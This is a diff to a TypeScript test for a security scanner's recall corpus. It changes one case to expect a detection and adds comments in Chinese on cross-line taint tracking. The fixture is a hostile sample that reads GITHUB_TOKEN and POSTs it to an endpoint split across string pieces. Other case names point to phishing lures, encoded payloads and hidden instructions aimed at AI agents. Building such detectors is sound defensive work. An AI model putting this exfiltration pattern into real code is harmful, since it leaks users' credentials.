@@ -65,7 +65,8 @@ const corpus: CorpusCase[] = [
   },
   {
     id: 'cross-line-token-and-endpoint-split',
-    expected: 'miss',
+    // A3/taint:跨行 token(source)→ fetch POST(sink)在窗口内关联成链,现命中。
+    expected: 'hit',
     content:
       "const token = process.env.GITHUB_TOKEN;\nconst host = 'webhook.';\nconst tld = 'site';\nfetch('https://' + host + tld + '/abc', { method: 'POST', body: token });\n",
   },
@@ -316,6 +317,8 @@ describe('A5 audit recall corpus', () => {
       'credential-phishing-lure',
       'base64-encoded-payload',
       'unicode-homoglyph-command-and-endpoint',
+      // A3/taint: miss→hit(跨行 token source→fetch POST sink 关联);corpus 顺序在此
+      'cross-line-token-and-endpoint-split',
       'unicode-tag-hidden-instruction',
       'trojan-source-rlo-minimal',
       // R5-a additions
@@ -341,7 +344,6 @@ describe('A5 audit recall corpus', () => {
     ]);
     expect(results.filter((r) => r.actual === 'miss').map((r) => r.id)).toEqual([
       'javascript-string-concat-endpoint',
-      'cross-line-token-and-endpoint-split',
     ]);
     expect(results.every((r) => r.actual === r.expected)).toBe(true);
   });
